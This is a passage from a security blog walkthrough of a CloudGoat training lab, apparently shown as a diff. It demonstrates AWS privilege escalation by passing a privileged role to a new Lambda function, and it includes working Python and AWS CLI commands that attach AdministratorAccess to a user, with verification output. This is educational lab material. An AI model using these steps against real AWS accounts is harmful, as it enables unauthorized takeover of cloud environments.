+<h2 id="Lambda-Function-Creation-and-Exploitation"><a href="#Lambda-Function-Creation-and-Exploitation" class="headerlink" title="Lambda Function Creation and Exploitation"></a>Lambda Function Creation and Exploitation</h2><h3 id="Creating-the-Malicious-Lambda-Function"><a href="#Creating-the-Malicious-Lambda-Function" class="headerlink" title="Creating the Malicious Lambda Function"></a>Creating the Malicious Lambda Function</h3><p>This technique is documented in the <a target="_blank" rel="noopener" href="https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation?tab=readme-ov-file#15-passing-a-role-to-a-new-lambda-function-then-invoking-it">AWS IAM Privilege Escalation Techniques</a> repository.</p>
+<p><strong>Required Permissions:</strong></p>
+<ul>
+<li><code>iam:PassRole</code></li>
+<li><code>lambda:CreateFunction</code></li>
+<li><code>lambda:InvokeFunction</code></li>
+</ul>
+<p>Create the Lambda function code (<code>lambda_function.py</code>):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    iam = boto3.client(<span class="string">&#x27;iam&#x27;</span>)</span><br><span class="line">    <span class="comment"># Attach AdministratorAccess policy to the user</span></span><br><span class="line">    iam.attach_user_policy(</span><br><span class="line">        UserName=<span class="string">&#x27;chris-[CLOUDGOAT-ID]&#x27;</span>,</span><br><span class="line">        PolicyArn=<span class="string">&#x27;arn:aws:iam::aws:policy/AdministratorAccess&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Policy attached!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Package the function:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip function.zip lambda_function.py</span><br></pre></td></tr></table></figure>
+
+<p>Create the Lambda function with the privileged role:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function \</span><br><span class="line">  --function-name exploit-function \</span><br><span class="line">  --runtime python3.12 \</span><br><span class="line">  --handler lambda_function.lambda_handler \</span><br><span class="line">  --role arn:aws:iam::[ACCOUNT-ID]:role/cg-debug-role-cgid[REDACTED] \</span><br><span class="line">  --zip-file fileb://function.zip \</span><br><span class="line">  --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="Function-Execution"><a href="#Function-Execution" class="headerlink" title="Function Execution"></a>Function Execution</h3><p>Invoke the malicious function:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name exploit-function out.json --profile init</span><br></pre></td></tr></table></figure>
+
+<p>Response:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Policy attached!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Verification-of-Privilege-Escalation"><a href="#Verification-of-Privilege-Escalation" class="headerlink" title="Verification of Privilege Escalation"></a>Verification of Privilege Escalation</h2><p>Verify that the chris user now has administrative privileges:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-attached-user-policies --user-name chris-cgid[REDACTED] --profile sec</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AttachedPolicies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdministratorAccess&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-chris-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:policy/cg-chris-policy-cgid[REDACTED]&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> The chris user now has the AdministratorAccess policy attached, providing full AWS administrative privileges.</p>
+<h2 id="About-CloudTap"><a href="#About-CloudTap" class="headerlink" title="About CloudTap"></a>About CloudTap</h2><p><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> is an essential tool for AWS security assessments that automates the tedious enumeration phase of penetration testing. Its key features include:</p>
+<ul>
+<li><strong>Automated Permission Discovery</strong>: Quickly identifies IAM policies and their permissions</li>
+<li><strong>Role Analysis</strong>: Comprehensive analysis of assumable roles and their privileges  </li>
+<li><strong>Auto-Assumption</strong>: Automatically assumes roles when possible, saving time</li>
+<li><strong>Privilege Escalation Detection</strong>: Identifies potential escalation paths</li>
+<li><strong>Clean Output</strong>: Well-formatted results that are easy to analyze</li>
+</ul>
+<p>CloudTap significantly speeds up the reconnaissance phase of AWS penetration testing, allowing security professionals to focus on exploitation and remediation rather than manual enumeration tasks.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Lambda-Privilege-Escalation-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Lambda Privilege Escalation Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automated-Enumeration-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Automated Enumeration with CloudTap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Permission-Discovery"><span class="toc-number">1.2.1.</span> <span class="toc-text">Initial Permission Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Role-Discovery-and-Auto-Assumption"><span class="toc-number">1.2.2.</span> <span class="toc-text">Role Discovery and Auto-Assumption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Permission-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Permission Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lambda-Manager-Role-Permissions"><span class="toc-number">1.3.1.</span> <span class="toc-text">Lambda Manager Role Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Target-Role-Discovery"><span class="toc-number">1.3.2.</span> <span class="toc-text">Target Role Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Strategy"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lambda-Function-Creation-and-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">Lambda Function Creation and Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Malicious-Lambda-Function"><span class="toc-number">1.5.1.</span> <span class="toc-text">Creating the Malicious Lambda Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-Execution"><span class="toc-number">1.5.2.</span> <span class="toc-text">Function Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Verification-of-Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Verification of Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#About-CloudTap"><span class="toc-number">1.7.</span> <span class="toc-text">About CloudTap</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&text=Cloudgoat-Lambda-Privesc"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&is_video=false&description=Cloudgoat-Lambda-Privesc"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-Lambda-Privesc&body=Check out this article: https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&title=Cloudgoat-Lambda-Privesc"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&name=Cloudgoat-Lambda-Privesc&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/26/Cloudgoat-Lambda_Privesc/&t=Cloudgoat-Lambda-Privesc"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
